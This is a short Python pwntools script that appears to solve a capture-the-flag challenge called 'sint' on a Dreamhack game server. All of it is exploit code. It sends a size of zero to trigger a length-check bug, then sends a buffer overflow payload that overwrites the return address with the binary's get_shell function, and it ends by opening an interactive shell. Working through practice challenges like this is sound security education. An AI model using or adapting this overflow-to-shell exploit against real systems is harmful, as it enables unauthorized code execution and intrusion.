#!/usr/bin/env python3
from pwn import *
exe = ELF('sint', checksec = False)

# p = process(exe.path)
p = remote('host1.dreamhack.games', 22604)

p.sendlineafter(b'Size: ', str(0).encode())
payload = b'a' * 0x104 + p32(exe.sym['get_shell'])
p.sendlineafter(b'Data: ', payload)


p.interactive()